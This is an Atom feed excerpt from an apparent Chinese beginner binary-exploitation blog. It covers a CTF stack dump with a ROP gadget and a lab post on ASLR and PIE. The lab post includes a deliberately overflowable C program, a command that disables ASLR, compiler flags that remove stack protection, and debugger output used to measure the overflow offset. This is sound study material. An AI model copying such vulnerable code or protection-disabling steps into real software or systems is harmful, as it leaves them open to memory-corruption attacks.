&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gef➤  telescope&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fff5df395c0&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0000&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x007fff5df396c8&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;        ← $rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fff5df395c8&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0008&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0000000100400430&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fff5df395d0&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0010&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x4141414141414141&lt;/span&gt;     ← $rsi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fff5df395d8&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0018&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x4141414141414141&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fff5df395e0&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0020&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x4141414141414141&lt;/span&gt;     ← $rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fff5df395e8&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0028&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x000000004005c1&lt;/span&gt;  →   pop rsi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x007fff5df395f0&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0030&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x00000000601018&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0x007fae5d96b020&lt;/span&gt;  →  &amp;lt;read+&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;gt; lea ra&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x, [rip+&lt;span class=&#34;number&#34;&gt;0x2e09b1&lt;/span&gt;]        # &lt;span class=&#34;number&#34;&gt;0x7fae5dc4b9d8&lt;/span&gt; &amp;lt;__libc_multiple_threads&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;给的libc-so-6怎么链接&#34;&gt;&lt;a href=&#34;#给的libc-so-6怎么链接&#34; class=&#34;headerlink&#34; title=&#34;给的libc.so.6怎么链接?&#34;&gt;&lt;/a&gt;给的libc.so.6怎么链接?&lt;/h2&gt;&lt;p&gt;&amp;#x2F;libc.so-3.6&lt;br&gt;GNU C Library (Ubuntu GLIBC 2.23-0ubuntu7) stable release version 2.23, by Roland McGrath et al.&lt;br&gt;Copyright (C) 2016 Free Software Foundation, Inc.&lt;br&gt;This is free software; see the source for copying conditions.&lt;br&gt;There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://devcraft.io/posts/2017/04/09/start-hard-asis-ctf-quals-2017.html&#34;&gt;https://devcraft.io/posts/2017/04/09/start-hard-asis-ctf-quals-2017.html&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2022-12-05T14:51:11.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-3-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6ALSR%E5%92%8CPIE/</id>
        <title>pwn入门-3-os保护机制ALSR和PIE</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-3-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6ALSR%E5%92%8CPIE/"/>
        <content type="html">&lt;h1 id=&#34;漏洞代码&#34;&gt;&lt;a href=&#34;#漏洞代码&#34; class=&#34;headerlink&#34; title=&#34;漏洞代码&#34;&gt;&lt;/a&gt;漏洞代码&lt;/h1&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void vuln_func() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	char buf[&lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	read(STDIN_FILENO, buf, &lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; main(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; argc, char *argv[]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	vuln_func();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	write(STDOUT_FILENO, &lt;span class=&#34;string&#34;&gt;&amp;quot;Hello world!\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;开启NX-未开启ALSR和PIE&#34;&gt;&lt;a href=&#34;#开启NX-未开启ALSR和PIE&#34; class=&#34;headerlink&#34; title=&#34;开启NX,未开启ALSR和PIE&#34;&gt;&lt;/a&gt;开启NX,未开启ALSR和PIE&lt;/h1&gt;&lt;p&gt;echo 0 &amp;gt; &amp;#x2F;proc&amp;#x2F;sys&amp;#x2F;kernel&amp;#x2F;randomize_va_space &amp;#x2F;&amp;#x2F; 关闭alsr&lt;/p&gt;
&lt;p&gt;gcc -m32 -fno-stack-protector -z noexecstack dep.c&lt;/p&gt;
&lt;p&gt;编译得到a.out&lt;/p&gt;
&lt;p&gt;根据源代码可以知道,这是一个很明显有缓冲区溢出漏洞,定义的数组是128,但读入了256.&lt;/p&gt;
&lt;p&gt;修改libc为2.23&lt;/p&gt;
&lt;p&gt;patchelf –set-interpreter &amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu11.3_i386&amp;#x2F;ld-linux.so.2 .&amp;#x2F;a.out&lt;br&gt;patchelf –set-rpath &amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu11.3_i386&amp;#x2F; .&amp;#x2F;a.out&lt;/p&gt;
&lt;h2 id=&#34;确定缓冲区大小&#34;&gt;&lt;a href=&#34;#确定缓冲区大小&#34; class=&#34;headerlink&#34; title=&#34;确定缓冲区大小&#34;&gt;&lt;/a&gt;确定缓冲区大小&lt;/h2&gt;&lt;p&gt;输入一点字符&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gef➤  telescope&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd520&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0000&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;	 ← $esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd524&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0004&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xffffd530&lt;/span&gt;  →  &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd528&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0008&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x00000100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd52c&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x000c&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x5655555c&lt;/span&gt;  →  &amp;lt;vuln_func+&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;&amp;gt; add eax, &lt;span class=&#34;number&#34;&gt;0x1a78&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd530&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0010&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd534&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0014&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd538&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0018&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd53c&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x001c&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd540&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0020&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaaaaaaaaaaaaaaaaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd544&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0024&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaaaaaaaaaaaaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gef➤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd548&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0028&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaaaaaaaaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd54c&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x002c&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaaaaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd550&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0030&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd554&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0034&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaabbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd558&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0038&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;bbbb\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd55c&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x003c&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x00000a&lt;/span&gt; (&lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;?)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd560&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0040&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd564&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0044&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x2c307d&lt;/span&gt; (&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#125;0,&amp;quot;&lt;/span&gt;?)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd568&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0048&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x00000001&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd56c&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x004c&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xf7ffc900&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gef➤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd570&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0050&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xffffd5c0&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0xffffd5e0&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0x00000001&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd574&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0054&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd578&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0058&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x01000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd57c&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x005c&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xc3442600&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd580&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0060&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x000009&lt;/span&gt; (&lt;span class=&#34;string&#34;&gt;&amp;quot;\t&amp;quot;&lt;/span&gt;?)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd584&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0064&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xffffd7ba&lt;/span&gt;  →  &lt;span class=&#34;string&#34;&gt;&amp;quot;/home/ubuntu/pwn/a.out&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd588&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0068&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xf7e15679&lt;/span&gt;  →  &amp;lt;__new_exitfn+&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;&amp;gt; add ebx, &lt;span class=&#34;number&#34;&gt;0x1a7987&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd58c&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x006c&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xf7fc0808&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd590&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0070&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xf7fbd000&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0x001d7d8c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd594&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0074&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xf7fbd000&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0x001d7d8c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gef➤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd598&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0078&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd59c&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x007c&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xf7e157db&lt;/span&gt;  →  &amp;lt;__internal_atexit+&lt;span class=&#34;number&#34;&gt;59&lt;/span&gt;&amp;gt; add esp, &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd5a0&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0080&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xf7fbd3fc&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0xf7fbe200&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd5a4&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0084&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x56556fd4&lt;/span&gt;  →  &amp;lt;_GLOBAL_OFFSET_TABLE_+&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;gt; fcomp QWORD PTR [esi]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd5a8&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0088&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xffffd67c&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0xffffd7d1&lt;/span&gt;  →  &lt;span class=&#34;string&#34;&gt;&amp;quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd5ac&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x008c&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x5655561b&lt;/span&gt;  →  &amp;lt;__libc_csu_init+&lt;span class=&#34;number&#34;&gt;75&lt;/span&gt;&amp;gt; add edi, &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd5b0&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0090&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x00000001&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd5b4&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0094&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x56556fd4&lt;/span&gt;  →  &amp;lt;_GLOBAL_OFFSET_TABLE_+&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;gt; fcomp QWORD PTR [esi]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd5b8&lt;/span&gt;│+&lt;span class=&#34;number&#34;&gt;0x0098&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xffffd5c8&lt;/span&gt;  →  &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;	 ← $ebp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;0xffffd5b8 - 0xffffd520 &amp;#x3D;  152&lt;/p&gt;
&lt;p&gt;为什么出不来书上的效果…pattern create 150那个&lt;/p&gt;
